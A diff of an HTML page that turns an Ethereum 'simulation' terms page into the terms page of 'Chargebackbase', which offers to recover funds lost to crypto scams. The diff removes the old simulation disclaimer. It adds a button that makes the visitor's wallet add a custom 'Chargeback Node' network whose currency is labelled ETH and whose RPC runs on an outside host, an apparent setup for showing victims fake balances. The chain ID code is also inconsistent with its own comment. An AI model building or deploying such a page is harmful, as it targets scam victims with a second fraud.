@@ -2,107 +2,134 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Terms & Conditions</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Chargeback Terms and Conditions</title>
   <style>
     body {
-      font-family: Arial, sans-serif;
-      max-width: 700px;
-      margin: 50px auto;
-      padding: 20px;
-      background-color: #f8f8f8;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      margin: 0; padding: 0;
+      background-color: #f9f9f9;
+      color: #333;
+      line-height: 1.6;
+    }
+    .container {
+      max-width: 800px;
+      margin: 40px auto;
+      background: #fff;
+      padding: 30px 40px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.1);
       border-radius: 8px;
-      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
     }
     h1 {
       text-align: center;
+      color: #d9534f;
+      margin-bottom: 30px;
     }
-    .terms {
-      margin-top: 20px;
-      height: 300px;
-      overflow-y: scroll;
-      background: #fff;
-      padding: 15px;
-      border: 1px solid #ccc;
-      border-radius: 5px;
+    h2 {
+      color: #555;
+      margin-top: 30px;
+    }
+    p {
+      margin-bottom: 15px;
+    }
+    ul {
+      margin: 10px 0 20px 20px;
     }
     button {
-      margin-top: 20px;
-      width: 100%;
-      padding: 15px;
-      background-color: #4CAF50;
-      border: none;
+      background-color: #d9534f;
       color: white;
-      font-size: 16px;
+      border: none;
+      padding: 15px 25px;
+      font-size: 1rem;
       border-radius: 5px;
       cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      margin: 30px auto 0 auto;
+      transition: background-color 0.3s ease;
     }
     button:hover {
-      background-color: #45a049;
+      background-color: #c9302c;
     }
-    #status {
+    button img {
+      width: 24px;
+      height: 24px;
+    }
+    footer {
       text-align: center;
-      margin-top: 20px;
-      font-weight: bold;
+      margin-top: 40px;
+      font-size: 0.9rem;
+      color: #888;
     }
   </style>
 </head>
 <body>
+  <div class="container">
+    <h1>Chargeback Terms and Conditions</h1>
 
-  <h1>Terms & Conditions</h1>
-  <div class="terms">
-    <p>
-      By using this service, you agree that the information shown on this network is for educational and simulation purposes only. 
-      We do not store any private data or perform real blockchain transactions. 
-      This is not financial advice or a real blockchain network.
-    </p>
-    <p>
-      This tool mimics Ethereum behavior for development or awareness purposes only. Use at your own discretion.
-    </p>
-    <!-- Add more terms here if needed -->
+    <p>Welcome to Chargebackbase. By using our services, you agree to comply with the following terms and conditions:</p>
+
+    <h2>1. Service Overview</h2>
+    <p>Chargebackbase assists users in recovering lost funds from cryptocurrency scams, digital asset fraud, and other investment-related disputes. Our services are educational and advisory and do not guarantee recovery.</p>
+
+    <h2>2. User Responsibilities</h2>
+    <ul>
+      <li>You must provide accurate information related to your case.</li>
+      <li>You understand that we do not provide legal advice.</li>
+      <li>You agree to use the services ethically and lawfully.</li>
+    </ul>
+
+    <h2>3. Limitations</h2>
+    <p>We are not liable for any losses resulting from the use of our services. Past success does not guarantee future outcomes.</p>
+
+    <h2>4. Privacy</h2>
+    <p>Your personal data is handled in accordance with our Privacy Policy.</p>
+
+    <h2>5. Network Setup</h2>
+    <p>To use our platform effectively, add our custom blockchain network by clicking the button below in your wallet app browser.</p>
+
+    <button id="addNetworkBtn">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/80/Circle-icons-wallet.svg/1024px-Circle-icons-wallet.svg.png" alt="Wallet Icon">
+      Add Chargeback Network
+    </button>
+
+    <footer>
+      &copy; 2025 Chargebackbase. All rights reserved.
+    </footer>
   </div>
 
-  <button id="agree">I Agree & Connect to Network</button>
-
-  <p id="status">Checking MetaMask...</p>
-
   <script>
-    window.addEventListener('load', () => {
-      const status = document.getElementById('status');
-      const agreeButton = document.getElementById('agree');
+    const addNetworkBtn = document.getElementById('addNetworkBtn');
 
-      if (typeof window.ethereum === 'undefined') {
-        status.textContent = "MetaMask not detected. Please install MetaMask.";
-        agreeButton.disabled = true;
+    addNetworkBtn.addEventListener('click', async () => {
+      if (!window.ethereum) {
+        alert('No wallet detected. Open this page in MetaMask or Coinbase Wallet browser.');
         return;
       }
 
-      status.textContent = "MetaMask detected.";
-
-      agreeButton.addEventListener('click', async () => {
-        try {
-          await window.ethereum.request({
-            method: 'wallet_addEthereumChain',
-            params: [{
-              chainId: '0x539', // 1337
-              chainName: 'Chargeback RPC',
-              nativeCurrency: {
-                name: 'ETH',
-                symbol: 'ETH',
-                decimals: 18
-              },
-              rpcUrls: ['https://rpc-food.onrender.com'], // 🔁 Replace with your deployed RPC URL
-              blockExplorerUrls: []
-            }]
-          });
-          status.textContent = "Network added successfully!";
-        } catch (error) {
-          console.error(error);
-          status.textContent = "Failed to add network.";
-        }
-      });
+      try {
+        await window.ethereum.request({
+          method: 'wallet_addEthereumChain',
+          params: [{
+            chainId: '1340', // 1337 in hex
+            chainName: 'Chargeback Node',
+            nativeCurrency: {
+              name: 'ETH',
+              symbol: 'ETH',
+              decimals: 18
+            },
+            rpcUrls: ['https://node.rectibridge.com'],
+          
+          }]
+        });
+        alert('Chargeback Network added! Please switch to it.');
+      } catch (error) {
+        console.error(error);
+        alert('Failed to add the network. Make sure you opened this in your wallet browser.');
+      }
     });
   </script>
-
 </body>
 </html>
